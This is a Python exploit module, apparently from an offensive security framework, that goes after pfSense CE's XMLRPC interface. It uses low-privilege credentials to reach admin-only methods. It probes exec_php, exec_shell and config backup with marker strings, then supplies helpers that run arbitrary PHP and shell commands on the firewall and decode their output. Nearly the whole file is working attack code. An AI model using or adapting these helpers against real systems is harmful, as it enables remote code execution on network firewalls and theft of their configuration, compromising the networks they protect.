#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""pfSense CE XMLRPC helpers."""

from __future__ import annotations

import base64
import textwrap
import xml.etree.ElementTree as ET
from typing import List, Optional, Tuple

from core.framework.base_module import BaseModule

ADMIN_METHODS = (
    "pfsense.exec_php",
    "pfsense.exec_shell",
    "pfsense.backup_config_section",
    "pfsense.get_installed_packages",
)


class Pfsense_xmlrpc(BaseModule):
    """Low-privilege access to admin-only XMLRPC methods."""

    def _rpc_creds(self) -> Tuple[str, str]:
        user = getattr(self, "username", "")
        pwd = getattr(self, "password", "")
        if hasattr(user, "value"):
            user = user.value
        if hasattr(pwd, "value"):
            pwd = pwd.value
        return str(user or ""), str(pwd or "")

    def pfsense_rpc(
        self,
        method: str,
        params_xml: str,
    ) -> Tuple[Optional[int], str]:
        user, password = self._rpc_creds()
        body = textwrap.dedent(
            f"""\
            <?xml version="1.0" encoding="utf-8"?>
            <methodCall>
              <methodName>{method}</methodName>
              <params>
                <param><value><string>{password}</string></value></param>
                {params_xml}
              </params>
            </methodCall>"""
        )
        token = base64.b64encode(f"{user}:{password}".encode()).decode()
        resp = self.http_request(
            "POST",
            "/xmlrpc.php",
            data=body,
            headers={
                "Content-Type": "text/xml",
                "Authorization": f"Basic {token}",
            },
            timeout=25,
        )
        if not resp:
            return None, ""
        return int(resp.status_code or 0), (resp.text or "")

    def pfsense_probe_methods(self) -> List[str]:
        reachable: List[str] = []
        for method in ADMIN_METHODS:
            if method == "pfsense.exec_php":
                params = "<param><value><string>echo 'cve92182';</string></value></param>"
            elif method == "pfsense.exec_shell":
                params = "<param><value><string>echo cve92182</string></value></param>"
            elif method == "pfsense.backup_config_section":
                params = "<param><value><string>system</string></value></param>"
            else:
                params = ""
            code, body = self.pfsense_rpc(method, params)
            if code == 200 and "fault" not in body.lower():
                reachable.append(method)
        return reachable

    def pfsense_exec_php(self, php_code: str) -> Tuple[Optional[int], str]:
        wrapped = (
            f"ob_start(); {php_code} $__out = ob_get_clean(); "
            "echo base64_encode($__out);"
        )
        params = f"<param><value><string>{wrapped}</string></value></param>"
        code, body = self.pfsense_rpc("pfsense.exec_php", params)
        if code != 200:
            return code, body
        try:
            root = ET.fromstring(body)
            b64 = root.findtext(".//string") or ""
            pad = b64 + "=" * (-len(b64) % 4)
            raw = base64.b64decode(pad).decode(errors="replace")
            return code, raw
        except Exception:
            return code, body

    def pfsense_exec_shell(self, cmd: str) -> Tuple[Optional[int], str]:
        safe = (cmd or "id").replace("&", "").replace("<", "")
        params = f"<param><value><string>{safe}</string></value></param>"
        return self.pfsense_rpc("pfsense.exec_shell", params)

    @staticmethod
    def pfsense_fingerprint(body: str) -> bool:
        blob = (body or "").lower()
        return "pfsense" in blob or "xmlrpc.php" in blob